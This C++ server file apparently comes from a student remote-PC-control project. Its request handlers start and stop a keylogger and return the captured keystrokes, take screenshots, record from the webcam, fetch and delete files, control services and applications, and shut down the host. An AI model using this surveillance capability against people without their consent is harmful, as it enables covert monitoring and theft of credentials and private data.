#include "Server.h"
#include "App.h"
#include "KeyLogger.h"
#include "File.h"
#include "Service.h"
#include "Webcam.h"
#include "Screenshot.h"
#include "Broadcast.h"


bool Server::keylog(Request& request, Response &response) {
    static KeyLogger keylog;

    std::string subaction = request.getParam(kSubAction);
    response.putParam(kStatus, "Ok");
    
    if (subaction == "Start") {
        cout << "Started keylogger\n";
        keylog.startKeylogger(); 
    } else if (subaction == "Stop") {
        cout << "Stopped keylogger\n";
        keylog.stopKeylogger();

        std::ifstream fin = keylog.getLoggingStream();
        std::string content; 
        std::string buf;
        while (getline(fin, buf)) {
            content += buf + "\n"; 
        }
        fin.close();
    
        response.putParam(kBody, content);

        // Gui file TODO DELETE
        // fin = std::ifstream("tmt.txt", fstream::binary);
        response.putParam(kFilePrefix + "tmt.txt", "");
    }  

    return true;
}

bool Server::handleShutdownSystem(Request& request, Response &response){
    App app;
    app.shutdownSystem();
    response.putParam(kStatus, "Shutdown initiated");
    return true;
}
bool Server::handleRestartSystem(Request& request, Response &response){
    App app;
    app.restartSystem();
    response.putParam(kStatus, "Restart initiated");
    return true;
}

bool Server::listRunningApps(Request& request, Response &response){
    try{
        App app;
        string appRunningList = app.getRunningAppsHTML();
        response.putParam(kUseHtml, "true");
        response.putParam(kBody, appRunningList);
        return true;
    } catch(const std::exception& e){
        response.putParam(kStatus, "Error");
        response.putParam(kBody, std::string("Failed to list running applications."));
        return false;
    }
}

bool Server::closeApp(Request& request, Response& response){
    try{
        App app;
        auto appList = app.getRunningTaskBarAppsbyPID();
        int pid = 0;
        try{
            pid = std::stoi(request.getParam("PID"));
        } catch(const std::exception& e){
            throw std::invalid_argument("Invalid PID format.");
        }
        // Nếu có tên cửa sổ kèm theo nữa.
        std::string WindowName = request.getParam("Window Name");
        std::vector<std::pair<std::string, DWORD>> matchingApps;
        for (const auto& appInfo : appList){
            if (appInfo.second == pid){
                matchingApps.push_back(appInfo);
            }
        }
        if (matchingApps.empty()){
            throw std::out_of_range("No running applications found with specified id");
        }
        if (!WindowName.empty()){
            auto it = std::find_if(matchingApps.begin(), matchingApps.end(),
                                   [&WindowName](const std::pair<std::string, DWORD>& app) {
                                       return app.first == WindowName;
                                   });
            if (it == matchingApps.end()) {
                throw std::out_of_range("No matching window found for PID and Window Name.");
            }

            bool success = app.closeApplicationByPIDandName(pid, WindowName);
            response.putParam(kBody, success ? "Application closed successfully." : "Failed to close application.");
            response.putParam(kStatus, success ? "Success" : "Failure");
            return success;
        }
        if (matchingApps.size() > 1){
            // std::string conflictMsg = "Multiple windows found with PID " + std::to_string(pid) + ":\n";
            // for (int i = 0; i < matchingApps.size(); ++i){
            //     conflictMsg += std::to_string(i + 1) + ". " + matchingApps[i].first + "\n";
            // }
            // response.putParam(kStatus, "Conflict");
            // response.putParam(kBody, conflictMsg + "Specify the window to close by Window Name.");
            // return false;

            string conflictApps = app.conflictApps(matchingApps, pid);
            response.putParam(kUseHtml, "true");
            response.putParam(kBody, conflictApps);
            return false;
        }
        bool success = app.closeApplication(pid);
        response.putParam(kStatus, success ? "Success": "Falied");
        response.putParam(kBody, success ? "Application closed successfully.": "Failed to close.");
        return success;
    } catch(const std::invalid_argument& e){
        response.putParam(kStatus, "Invalid Parameter.");
        response.putParam(kBody, std::string(e.what()));
    } catch(const std::out_of_range &e){
        response.putParam(kStatus, "Invalid Range.");
        response.putParam(kBody, std::string(e.what()));
    } catch(const std::exception& e){
        response.putParam(kStatus, "Error");
        response.putParam(kBody, "Failed to close application: " + std::string(e.what()));
    }
    return false;
}

bool Server::listInstalledApps(Request& request, Response& response){
    try{
        App app;
        string appList = app.getInstalledAppsHTML();
        response.putParam(kUseHtml, "true");
        response.putParam(kBody, appList);
        return true;
    } catch(const std::exception& e){
        response.putParam(kStatus, "Error");
        response.putParam(kBody, std::string("Failed to list installed applications.\n"));
        return false;
    }
}

bool Server::runApp(Request& request, Response &response){
    try{
        App app;
        std::vector<AppInfo> appList = app.getInstalledApps();
        int appIndex = 0;
        try{
            appIndex = std::stoi(request.getParam("App Index"));
        } catch(const std::exception& e){
            throw std::invalid_argument("Invalid App Index format");
        }

        if (appIndex <= 0 || appIndex > appList.size()){
            throw std::out_of_range("App Index out of range");
        }
        std::string appPath = appList[appIndex - 1].fullpath;
        bool success = app.runApplication(appPath);

        response.putParam(kBody, success ? "App is running" : "Failed to run");
        return true;
    } catch(const std::invalid_argument& e){
        response.putParam(kStatus, "Invalid Parameter");
        response.putParam(kBody, std::string(e.what()));
    } catch (const std::out_of_range &e){
        response.putParam(kStatus, "Invalid range");
        response.putParam(kBody, std::string(e.what()));
    } catch (const std::exception& e){
        response.putParam(kStatus, "Error");
        response.putParam(kBody, std::string("Failed to run application: ") + e.what());
    }
    return false;
}

bool Server::handleApp(Request& request, Response& response){
    std::string subAction = toLower(request.getParam(kSubAction));
    if (subAction == "list running apps")
        return listRunningApps(request, response);
    else if (subAction == "close app")
        return closeApp(request, response);
    else if (subAction == "list installed apps")
        return listInstalledApps(request, response);
    else if (subAction == "run app")
        return runApp(request, response);
    else{
        response.putParam(kStatus, "Invalid sub action");
        return false;
    }
}

bool Server::handleStatus(Request& request, Response& response){
    std::string subAction = toLower(request.getParam(kSubAction));
    if (subAction == "shutdown")
        return handleShutdownSystem(request, response);
    else if (subAction == "restart")
        return handleRestartSystem(request, response);
    else{
        response.putParam(kStatus, "Invalid subaction");
        return false;
    }
}

// Thang : File & Service
// ---Start---
bool Server::handleGetListFile(Request& request, Response& response){
    File file;
    string file_path = request.getParam("Path");
    string file_list = file.getFiles(file_path);
    response.putParam(kBody, file_list);
    return true;

}

bool Server::handleGetFile(Request& request, Response& response) {
    File file;
    std::string paths = request.getParam("Path"); // Lấy danh sách đường dẫn từ tham số "Path"
    std::istringstream pathStream(paths); // Dùng istringstream để tách các đường dẫn
    std::string file_path;

    while (std::getline(pathStream, file_path, ' ')) { // Duyệt từng đường dẫn cách nhau bởi khoảng trắng
        std::string file_name = file_path.substr(file_path.find_last_of("/\\") + 1);
        file.getFile(file_path); // Sao chép file từ đường dẫn
        if (file_name.empty()) {
            std::cerr << "Failed to process file at path: " << file_path << std::endl;
            response.putParam("Error", "Failed to process file at: " + file_path);
            return false; // Dừng nếu có lỗi
        }
        
        // Thêm tên file vào response với tiền tố kFilePrefix
        response.putParam(kFilePrefix + file_name.c_str(), "");
    }

    return true; // Thành công nếu tất cả file được xử lý
}


bool Server::handleDeleteFile(Request& request, Response& response){
    File file;
    std::string file_path = request.getParam("Path");
    file.deleteFile(file_path);
    response.putParam(kBody, "Deleted File");
    return true;
}

bool Server::handleFile(Request& request, Response& response){
    string subAction = toLower(request.getParam(kSubAction));
    if (subAction == "list file")
        return handleGetListFile(request, response);
    else if (subAction == "get file")
        return handleGetFile(request, response);
    else if (subAction == "delete file")
        return handleDeleteFile(request, response);
    else{
        response.putParam(kStatus, "Invalid sub action");
        return false;
    }
    return true;
}


bool Server::listServices(Request& request, Response& response){
    Service service;
    std::string list_service = service.listServices();
    response.putParam(kBody, list_service);
    return true;
}

bool Server::startService(Request& request, Response& response){
    Service service;
    string name_service = request.getParam("Name");
    bool success = service.StartServiceByName(name_service);
    response.putParam(kBody, success ? "Start service success" : "Failed to run");
    return true;
}

bool Server::stopService(Request& request, Response& response){
    Service service;
    string name_service = request.getParam("Name");
    bool success = service.StopServiceByName(name_service);
    response.putParam(kBody, success ? "Stop service success" : "Failed to stop");
    return true;
}

bool Server::handleService(Request& request, Response& response){
    string subAction = toLower(request.getParam(kSubAction));
    response.putParam(kUseHtml, "true"); 
    if (subAction == "list service")
        return listServices(request, response);
    else if (subAction == "start service")
        return startService(request, response);
    else if (subAction == "stop service")
        return stopService(request, response);
    else{
        response.putParam(kStatus, "Invalid sub action");
        return false;
    }
    return true;
}

// bool Server::processReq(Request& request, Response& response) {
//     std::string requestId = request.getParam("RequestId"); // Mỗi request cần ID duy nhất
//     std::string resume = request.getParam("Resume"); // Kiểm tra client yêu cầu tiếp tục
    
//     if (!resume.empty()) {
//         // Tiếp tục từ trạng thái tạm
//         std::string tempData = loadTempResponse(requestId);
//         if (!tempData.empty()) {
//             response.setParams({{"Body", tempData}});
//             response.putParam(kStatus, "Resumed");
//             clearTempResponse(requestId); // Xóa sau khi gửi lại
//             return true;
//         }
//         response.putParam(kStatus, "Error");
//         response.putParam(kBody, "No previous response found.");
//         return false;
//     }

//     // Thực hiện xử lý bình thường
//     std::string responseData = "This is the response data."; // Dữ liệu ví dụ
//     saveTempResponse(requestId, responseData); // Lưu trước khi gửi
//     response.setParams({{"Body", responseData}});
//     response.putParam(kStatus, "Ok");

//     return true;
// }

// ---End--- (File & Service)

bool Server::processRequest(Request& request, Response &response) {
    cout << "Processing Request\n" << request << "\n";
    response.setAction(request.getAction());
    response.setParams(request.getParams());

    // TODO param order
    
    switch (request.getAction()) {
        case ACTION_KEYLOG:
            return keylog(request, response);
        case ACTION_SHUTDOWN:
            return handleStatus(request, response);
        case ACTION_APP:
            return handleApp(request, response);
        case ACTION_SERVICES:
            return handleService(request, response);
        case ACTION_FILE:
            return handleFile(request, response);
        case ACTION_SCREENSHOT:
            return screenshot(request, response);
        case ACTION_WEBCAM:
            return getVideoByWebcam(request, response);
        case ACTION_BROADCAST:
            return PCnameandIP(request, response);
        default:
            return false;
    }
}

//Duc
bool Server::screenshot(Request& request, Response &response){
    std::string subaction = toLower(request.getParam(kSubAction));
    response.putParam(kStatus, "Ok");

    Screenshot screenshot;
    const std::string filename = "files/screencapture.bmp";

    if (subaction == "screenshot") {
        std::cout << "Started screenshot!\n";
        screenshot.screenshot(filename);
    }
    response.putParam(kFilePrefix + "screencapture.bmp", "");
    return true;
}

bool Server::getVideoByWebcam(Request& request, Response &response) {
    Webcam webcam;
    const std::string filename = "../build/files/video.mp4";
    
    while (true){
        std::string subaction = request.getParam(kSubAction);
        response.putParam(kStatus, "Ok");

        if (subaction == "Start") {
            bool started = webcam.StartWebcamRecording(filename);
            if (!started) {
                std::cerr << "Error: Unable to start recording." << std::endl;
                return -1;
            }
        }
        else if (subaction == "Stop") {
            bool stopped = webcam.StopWebcamRecording();
            if (!stopped) {
                std::cerr << "Error: Unable to stop recording." << std::endl;
                return -1;
            }
            break;
        }
    }
    response.putParam(kFilePrefix + "video.mp4", ""); 
    return true;
}

bool Server::PCnameandIP(Request& request, Response& response) {
    // Broadcast broadcast;
    // Lấy subAction từ request
    std::string subAction = toLower(request.getParam(kSubAction));
    // Xử lý subAction "listpcname-ip"
    if (subAction == "list pc name-ip") {
        // std::string ip = getIPAddress();
        // std::string pcname = getPCName();

        // Kiểm tra xem IP và PCName có hợp lệ không
        // if (ip.empty() || pcname.empty() || ip == "Unknown_IP" || pcname == "Unknown PC") {
        //     response.putParam(kStatus, "Error");
        //     response.putParam(kBody, "Unable to retrieve PC information.");
        //     return false;
        // }

        // Lấy thông tin PC và trả về trong response
        std::string PCInfo = getPCInfo();
        // if (PCInfo.empty()) {
        //     response.putParam(kStatus, "Error");
        //     response.putParam(kBody, "Failed to retrieve PC information.");
        //     return false;
        // }

        // response.putParam(kStatus, "Ok");
        response.putParam(kBody, PCInfo);
        return true;
    }
    // Xử lý subAction không xác định
    response.putParam(kStatus, "Error");
    response.putParam(kBody, "Unknown Sub Action: " + subAction);
    return false;
}